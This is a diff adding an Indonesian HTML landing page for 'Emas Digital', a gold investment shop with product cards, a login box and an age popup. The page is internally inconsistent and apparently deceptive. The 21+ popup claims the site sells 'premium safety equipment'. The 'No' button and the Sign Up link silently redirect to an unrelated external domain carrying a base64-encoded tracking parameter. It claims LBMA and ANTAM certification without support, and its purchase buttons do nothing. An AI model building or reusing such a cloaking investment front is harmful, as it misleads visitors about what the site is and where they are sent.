@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Emas Digital | Investasi Aman & Modern</title>
+<style>
+body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#f5f5f5;color:#222}
+header{background:#111;color:#fff;position:sticky;top:0;z-index:10}
+nav{display:flex;justify-content:space-between;align-items:center;padding:15px 40px}
+nav .logo{font-size:22px;font-weight:bold}
+nav ul{list-style:none;display:flex;gap:25px;margin:0;padding:0}
+nav ul li{cursor:pointer}
+nav ul li:hover{color:#ffcc00}
+.hero{background:url('https://images.unsplash.com/photo-1601924638867-3ec62a1d6d5b') center/cover no-repeat;height:70vh;display:flex;align-items:center;padding:40px;color:white}
+.hero div{background:rgba(0,0,0,0.6);padding:30px;border-radius:10px;max-width:500px}
+.hero h1{font-size:40px;margin:0 0 15px}
+.hero button{padding:12px 20px;border:none;background:#ffcc00;font-weight:bold;cursor:pointer;border-radius:6px}
+section{padding:60px 40px}
+.products{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:30px}
+.card{background:white;border-radius:12px;box-shadow:0 8px 20px rgba(0,0,0,0.1);overflow:hidden}
+.card img{width:100%;height:220px;object-fit:cover}
+.card .info{padding:20px}
+.price{color:#d35400;font-weight:bold;margin:10px 0}
+.card button{width:100%;padding:10px;border:none;background:#111;color:white;cursor:pointer;border-radius:6px}
+.card button:hover{background:#333}
+footer{background:#111;color:#ccc;text-align:center;padding:25px}
+/* popup umur */
+#agePopup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:999}
+#agePopup .box{background:white;padding:30px;border-radius:10px;text-align:center;max-width:400px}
+#agePopup button{margin:10px;padding:10px 18px;border:none;border-radius:6px;cursor:pointer}
+#yes{background:#27ae60;color:white}
+#no{background:#c0392b;color:white}
+/* login */
+#loginPage{display:none;padding:80px 20px}
+.login-box{max-width:400px;margin:auto;background:white;padding:30px;border-radius:10px;box-shadow:0 10px 25px rgba(0,0,0,0.1)}
+.login-box input{width:100%;padding:10px;margin:10px 0}
+.login-box button{width:100%;padding:10px;background:#111;color:white;border:none}
+</style>
+</head>
+<body>
+
+<div id="agePopup">
+  <div class="box">
+    <h2>Konten 21+</h2>
+    <p>Website ini menjual perlengkapan keselamatan premium. Apakah Anda berusia 21 tahun ke atas?</p>
+    <button id="yes">Ya, saya 21+</button>
+    <button id="no">Tidak</button>
+  </div>
+</div>
+
+<header>
+  <nav>
+    <div class="logo">EMAS•DIGITAL</div>
+    <ul>
+      <li onclick="showHome()">Beranda</li>
+      <li onclick="scrollToSection('produk')">Produk</li>
+      <li onclick="scrollToSection('keunggulan')">Keunggulan</li>
+      <li onclick="scrollToSection('kontak')">Kontak</li>
+      <li onclick="showLogin()">Login</li>
+    </ul>
+  </nav>
+</header>
+
+<div id="home">
+<section class="hero">
+  <div>
+    <h1>Emas Digital & Fisik Premium</h1>
+    <p>Investasi emas aman, transparan, dan bersertifikat internasional.</p>
+    <button onclick="scrollToSection('produk')">Lihat Produk</button>
+  </div>
+</section>
+
+<section id="produk">
+<h2>Produk Emas Unggulan</h2>
+<div class="products">
+  <div class="card">
+    <img src="https://images.unsplash.com/photo-1605792657660-596af9009e82">
+    <div class="info">
+      <h3>Emas Digital 1 Gram</h3>
+      <div class="price">Rp 1.250.000</div>
+      <button>Beli Sekarang</button>
+    </div>
+  </div>
+  <div class="card">
+    <img src="https://images.unsplash.com/photo-1611078489935-0cb964de46d6">
+    <div class="info">
+      <h3>Emas Batangan 5 Gram</h3>
+      <div class="price">Rp 6.200.000</div>
+      <button>Beli Sekarang</button>
+    </div>
+  </div>
+  <div class="card">
+    <img src="https://images.unsplash.com/photo-1611078489872-0a7d1fba163f">
+    <div class="info">
+      <h3>Emas Batangan 10 Gram</h3>
+      <div class="price">Rp 12.300.000</div>
+      <button>Beli Sekarang</button>
+    </div>
+  </div>
+</div>
+</section>
+
+<section id="keunggulan">
+<h2>Kenapa Pilih Emas Digital?</h2>
+<ul>
+  <li>✔ Sertifikat LBMA & ANTAM</li>
+  <li>✔ Harga Real-Time & Transparan</li>
+  <li>✔ Penyimpanan Aman & Penarikan Mudah</li>
+</ul>
+</section>
+
+<section id="kontak">
+<h2>Kontak Kami</h2>
+<p>Email: support@emasdigital.id</p>
+<p>WhatsApp: 08xxxxxxxx</p>
+</section>
+</div>
+
+<div id="loginPage">
+  <div class="login-box">
+    <h2>Login</h2>
+    <input type="text" placeholder="Username">
+    <input type="password" placeholder="Password">
+    <button>Login</button>
+    <p>Belum punya akun? <a href="https://yutub.rangunan.my.id?datainfo=MjAwODM5MjEyOA==">Sign Up</a></p>
+  </div>
+</div>
+
+<footer>
+<p>© 2026 Emas Digital. All rights reserved.</p>
+</footer>
+
+<script>
+const popup=document.getElementById('agePopup');
+document.getElementById('yes').onclick=()=>popup.style.display='none';
+document.getElementById('no').onclick=()=>window.location.href='https://yutub.rangunan.my.id?datainfo=MjAwODM5MjEyOA==';
+function scrollToSection(id){document.getElementById(id).scrollIntoView({behavior:'smooth'});}
+function showLogin(){document.getElementById('home').style.display='none';document.getElementById('loginPage').style.display='block';}
+function showHome(){document.getElementById('loginPage').style.display='none';document.getElementById('home').style.display='block';}
+</script>
+
+</body>
+</html>
